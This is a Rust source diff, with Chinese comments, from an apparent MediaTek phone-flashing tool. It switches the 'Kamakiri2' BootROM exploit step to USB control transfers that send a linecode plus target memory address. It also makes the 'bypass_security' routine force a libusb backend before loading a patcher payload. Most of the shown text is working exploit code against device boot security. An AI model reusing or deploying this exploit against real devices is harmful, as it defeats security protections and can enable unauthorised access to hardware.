@@ -41,12 +41,16 @@ impl Preloader {
 
     /// Kamakiri2 单步：设置 BROM 内存访问指针
     /// 
-    /// 纯 brom_register_access 实现（不依赖 USB ctrl_transfer）
-    /// libusb 和串口共用同一套 BROM 协议路径
-    fn kamakiri2_step(&mut self, _lc: &[u8], ptr_da_bra: u32, addr: u32) -> Result<(), String> {
-        // 通过 BROM 协议向目标内存地址写入 ptr_da_bra（设置内存访问指针）
-        // addr 是目标内存地址，写入 ptr_da_bra 来设置 BROM 的访问指针
-        let _ = self.brom_register_access(addr, 1, Some(&ptr_da_bra.to_le_bytes()), false);
+    /// 仅 libusb 路径：通过 USB ctrl_transfer 发送 linecode + 地址
+    /// 串口模式已被 ensure_libusb 切换，此处不应再遇到串口 transport
+    fn kamakiri2_step(&mut self, lc: &[u8], _ptr_da_bra: u32, addr: u32) -> Result<(), String> {
+        if !self.device.is_libusb() {
+            return Err("kamakiri2_step: 当前为串口模式，libusb ctrl_transfer 不可用".into());
+        }
+        let mut d = lc.to_vec();
+        d.extend(&addr.to_le_bytes());
+        self.device.ctrl_transfer_out(0x21, 0x20, 0, 0, &d)?;
+        let _ = self.device.ctrl_transfer_in(0x80, 0x06, 0x02FF, 0, 9);
         Ok(())
     }
 
@@ -182,10 +186,13 @@ impl Preloader {
             "[inject] ptr_da_bra=0x{:08X} ptr_da=0x{:08X}",
             ptr_da_bra, ptr_da
         );
-        info!("[EXPLOIT] using serial backend — Kamakiri2 via brom_register_access");
+        info!("[EXPLOIT] using libusb backend — Kamakiri2 via ctrl_transfer");
 
-        // 串口模式下 kamakiri2_step 不使用 linecode，使用空数组
-        let lc: Vec<u8> = Vec::new();
+        // linecode：libusb ctrl_transfer 读取
+        let linecode = self.device.ctrl_transfer_in(0xA1, 0x21, 0, 0, 7)?;
+        let mut lc = linecode.to_vec();
+        lc.push(0);
+        debug!("[inject] linecode={:02X?}", lc);
 
         let ptr_send = self.read_payload_address(&lc, ptr_da_bra, ptr_da, chip.watchdog)?;
         debug!("[inject] ptr_send=0x{:08X}", ptr_send);
@@ -410,7 +417,15 @@ impl Preloader {
         Ok(preloader)
     }
 
-    pub fn bypass_security(&mut self) -> Result<(), String> {
+    pub fn bypass_security(&mut self, context: &UsbContext) -> Result<(), String> {
+        // 🔥 强制切换 libusb（刷机匣级稳定性）
+        // Serial = 初始化，libusb = exploit
+        self.ensure_libusb(context)?;
+
+        if !self.device.is_libusb() {
+            return Err("Kamakiri2 requires libusb backend".into());
+        }
+
         info!("正在绕过安全保护...");
 
         let payload_path = exe_relative_path("payloads/generic_patcher_payload.bin");
